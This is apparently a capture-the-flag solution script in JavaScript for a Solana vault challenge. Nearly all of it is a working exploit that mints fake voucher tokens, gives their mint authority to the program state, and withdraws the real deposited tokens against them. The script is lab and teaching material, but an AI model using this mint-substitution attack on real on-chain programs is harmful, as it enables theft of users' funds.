import * as fs from "fs";
import * as anchor from "@project-serum/anchor";
import { BN } from "bn.js";

import * as api from "./api.js"; 
import { parseAccounts, sendInstructions } from "./util.js";
import { Keypair, SystemProgram, Transaction } from "@solana/web3.js";
import { createAssociatedTokenAccountInstruction, createInitializeMintInstruction, createMint, createMintToInstruction, createSetAuthorityInstruction, getAssociatedTokenAddress, MINT_SIZE, setAuthority, TOKEN_PROGRAM_ID } from "@solana/spl-token";

const idl = JSON.parse(fs.readFileSync("../idl/challenge1.json"));
const accountFile = parseAccounts(fs.readFileSync("../" + api.PLAYERFILE));
const player = accountFile.player;
const accounts = accountFile.challengeOne;
const program = new anchor.Program(idl, accounts.programId.toString(), "fake truthy value");
const baseUrl = accountFile.endpoint.match(/^(https*:\/\/[^\/]+)\/.*/)[1];
const conn = new anchor.web3.Connection(accountFile.endpoint);

// all player code goes here
async function attack() {
  const voucherDecimals = 6;
  const voucherSupplyAtomics = 1_000_000;
  const fakeVoucherMintKp = Keypair.generate();
  const {
    state,
    depositAccount,
    bitcoinMint,
  } = accounts;
  const mintRentLamports = 1461600;
  const fakeVoucherAta = await getAssociatedTokenAddress(
    fakeVoucherMintKp.publicKey,
    player.publicKey,
  );
  const btcAta = await getAssociatedTokenAddress(
    bitcoinMint,
    player.publicKey,
  );

  const tx = new Transaction();
  tx.add(SystemProgram.createAccount({
    fromPubkey: player.publicKey,
    newAccountPubkey: fakeVoucherMintKp.publicKey,
    space: MINT_SIZE,
    lamports: mintRentLamports,
    programId: TOKEN_PROGRAM_ID,
  }));
  tx.add(createInitializeMintInstruction(
    fakeVoucherMintKp.publicKey,
    voucherDecimals,
    player.publicKey,
    player.publicKey,
    TOKEN_PROGRAM_ID,
  ));
  tx.add(createAssociatedTokenAccountInstruction(
    player.publicKey,
    fakeVoucherAta,
    player.publicKey,
    fakeVoucherMintKp.publicKey,
  ));
  tx.add(createMintToInstruction(
    fakeVoucherMintKp.publicKey,
    fakeVoucherAta,
    player.publicKey,
    voucherSupplyAtomics,
  ));
  tx.add(createSetAuthorityInstruction(
    fakeVoucherMintKp.publicKey,
    player.publicKey,
    0, // mintAuthority
    state,
  ));
  tx.add(
    await program.methods.withdraw(new BN(voucherSupplyAtomics))
      .accounts({
        player: player.publicKey,
        depositor: player.publicKey,
        state,
        depositAccount,
        depositorAccount: btcAta,
        voucherMint: fakeVoucherMintKp.publicKey,
        depositorVoucherAccount: fakeVoucherAta,
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      .instruction()
  );

  await conn.sendTransaction(tx, [player, fakeVoucherMintKp]);
}

console.log("running attack code...");
await attack();

console.log("checking win...");
const flag = await api.getFlag(baseUrl, player.publicKey, 1);

if(flag) {
    console.log("win! your flag is:", flag);
}
else {
    console.log("no win");
}